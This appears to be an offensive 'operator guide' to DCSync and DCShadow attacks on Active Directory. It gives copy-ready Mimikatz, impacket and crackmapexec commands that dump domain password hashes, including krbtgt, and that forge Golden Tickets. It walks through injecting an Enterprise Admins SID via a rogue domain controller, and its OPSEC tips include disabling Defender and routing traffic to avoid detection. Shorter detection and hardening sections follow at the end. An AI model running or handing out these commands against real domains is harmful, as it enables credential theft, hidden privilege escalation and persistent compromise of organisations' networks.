---
title: "DCSync and DCShadow: Abusing Replication Rights for Credential Theft and Persistence"
description: "A complete operator guide to DCSync and DCShadow - the replication APIs MS-DRSR opens up, how to abuse them for NTDS extraction and stealth object modification, and what actually shows up in the 4662 event log."
date: 2026-04-16
difficulty: Hard
tags: [active-directory, dcsync, dcshadow, persistence, mimikatz, impacket]
---

## Background: MS-DRSR Replication

Domain Controllers replicate directory data with each other using the **Directory Replication Service Remote Protocol (MS-DRSR)**, exposed over RPC. The method of interest is `DRSGetNCChanges` - "send me the changes in this naming context since the last replication epoch." With the right extended rights, *any principal* can call it, not just a DC.

That's the primitive. DCSync is a read using this method. DCShadow is a write.

## DCSync - Extracting Secrets Without Touching NTDS.dit

### Required Extended Rights

Three rights on the domain object (`DC=corp,DC=local`) are enough:

| Right | GUID |
|---|---|
| `DS-Replication-Get-Changes` | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` |
| `DS-Replication-Get-Changes-All` | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` |
| `DS-Replication-Get-Changes-In-Filtered-Set` | `89e95b76-444d-4c62-991a-0facbeda640c` |

By default, the following principals hold these rights:

- Domain Admins
- Enterprise Admins
- Administrators
- Domain Controllers
- **Often misconfigured**: Exchange Enterprise Servers, Azure AD Connect sync account (`MSOL_*`), backup/monitoring service accounts

The last group is the interesting one. If you compromise an account with replication rights, you don't need Domain Admin.

### BloodHound Finds the Path

```cypher
MATCH p=shortestPath(
  (u:User {owned:true})-[r:MemberOf*0..|GetChanges|GetChangesAll]->(d:Domain)
)
RETURN p
```

If BloodHound shows an edge labeled `GetChangesAll` from one of your owned principals to the domain - that's your ticket.

### Executing DCSync

**Mimikatz** on a Windows host with network path to a DC:

```powershell
# Single account
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# All accounts
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

**Impacket secretsdump** from Linux:

```bash
impacket-secretsdump -just-dc-ntlm corp.local/svc_replicator:'Pa55w0rd!'@dc01.corp.local

# Include Kerberos keys for Silver/Golden Ticket forging
impacket-secretsdump corp.local/svc_replicator:'Pa55w0rd!'@dc01.corp.local
```

**crackmapexec** for one-liner reconnaissance-sized dumps:

```bash
crackmapexec smb dc01.corp.local -u svc_replicator -p 'Pa55w0rd!' --ntds
```

### What You Get

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8e9e0c78f5f1a9f9d5b6c8a7b4d3e2f1:::
corp.local\svc_sql:1104:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
```

The `krbtgt` hash is the crown jewel - it unlocks Golden Ticket forgery:

```bash
impacket-ticketer -nthash 8e9e0c78... -domain-sid S-1-5-21-... -domain corp.local Administrator
```

### OPSEC Notes

- DCSync requests from **non-DC source IPs** are anomalous. SOCs with `4662` (Operation performed on object) monitoring + GUID filter on the three replication rights will catch it.
- `krbtgt`-only dumps leave a smaller footprint than `/all`.
- Source IP matters - route through an already-trusted host when possible.
- Disable Windows Defender real-time protection on your operator host first; `lsadump::dcsync` is a signature hit.

## DCShadow - Writing to Replicated Objects Without a DC

DCSync reads. DCShadow writes. The technique, discovered by Delpy & Le Toux, lets an attacker **register a rogue DC** long enough to push a single replication update, then deregister it. The legitimate DCs accept the change because it came in through the normal replication path.

### Why This Matters

No Event 4738 (user account changed). No `Set-ADUser`. No PowerShell Script Block log. The change is written via replication, which historically isn't audited the same way. Perfect for:

- Granting yourself `sidHistory` containing Enterprise Admins (`S-1-5-21-root-519`)
- Adding a `servicePrincipalName` to a user for later Kerberoasting
- Resetting `userAccountControl` to enable DONT_REQ_PREAUTH (ASREPRoast any user)
- Setting arbitrary attributes for persistence (e.g., `primaryGroupID = 512`)

### Required Rights

DCShadow needs **more** than DCSync - you're impersonating a DC:

- `DS-Install-Replica` (or `DS-Replication-Manage-Topology`)
- `DS-Replication-Synchronize`
- Write access to the target object's attributes you want to modify
- Local Administrator on the host you run from (to register the SPN + create the nTDSDSA object)

Typically Domain Admin or equivalent is required. So DCShadow isn't a privilege-escalation primitive - it's a **stealth persistence** primitive.

### Walkthrough

DCShadow runs in two Mimikatz sessions: one SYSTEM-level to register the fake DC, one user-level to push changes.

**Session 1 (SYSTEM - right-click "Run as SYSTEM" via PsExec):**

```powershell
PS> PsExec64.exe -s -i cmd.exe
C:\> mimikatz.exe

mimikatz # lsadump::dcshadow /object:CN=jsmith,CN=Users,DC=corp,DC=local /attribute:sidHistory /value:S-1-5-21-root-519
```

**Session 2 (normal user with replication rights - trigger the push):**

```powershell
mimikatz # lsadump::dcshadow /push
```

Session 1 acts as the rogue DC; session 2 initiates replication. The DC accepts the update, writes `sidHistory = S-1-5-21-root-519` onto `jsmith`, then the rogue DC deregisters.

Next time `jsmith` logs in with a Kerberos ticket, the TGT contains the Enterprise Admins SID in its PAC. Effective Enterprise Admin, with no group membership change to detect.

### Detection (What a Defender Sees)

- Short-lived `nTDSDSA` object creation under `CN=Sites,CN=Configuration,...`
- SPN registration for `GC/<hostname>/<domain>` from a non-DC host
- Event `4742` (Computer account changed) with suspicious flags
- Replication traffic (port 135 + dynamic RPC, or 49152-65535) from a non-DC IP
- Sysmon Event 1 for `mimikatz.exe` or a renamed binary with SYSTEM token

Good detection engineering looks for the SPN + nTDSDSA creation, not the replication itself.

## Alternative Tooling

- `Set-DCShadowPermissions.ps1` - self-grants required rights if you have DA already.
- `impacket-dcomexec` + `lsadump::dcshadow` piped over SMB for fully remote operation.
- `noPac` (CVE-2021-42278 / 42287) - if the domain is unpatched, you can go straight to DA without replication rights at all, then use DCShadow for persistence afterward.

## Defensive Recommendations

If you're on the blue side:

1. **Baseline replication rights.** PowerView / ACLight will enumerate accounts with `GetChanges*` - most orgs have surprises here (old Exchange, orphaned service accounts).
2. **Audit 4662 with GUID filters** for the three replication GUIDs, source IP whitelist on DCs only.
3. **Protected Users + authentication silo** for Tier 0 accounts so they can't be relay/DCSync targets.
4. **Monitor `nTDSDSA` object creation** under the Configuration NC - there shouldn't be more than your legitimate DCs.
5. **Azure AD Connect**: put the sync account in **staging mode** during incident response to prevent a compromised sync account from being used for DCSync.

## Summary

DCSync is the fastest way to extract `krbtgt` if you have the right ACL. DCShadow is the sneakiest way to modify AD if you already have Domain Admin. Both abuse `MS-DRSR` - the same RPC your DCs use to talk to each other, which is why they're such hard targets to detect without deliberate engineering around replication rights.

> The defender's job isn't to block replication - it's to know exactly which principals are supposed to perform it, and scream when anyone else does.
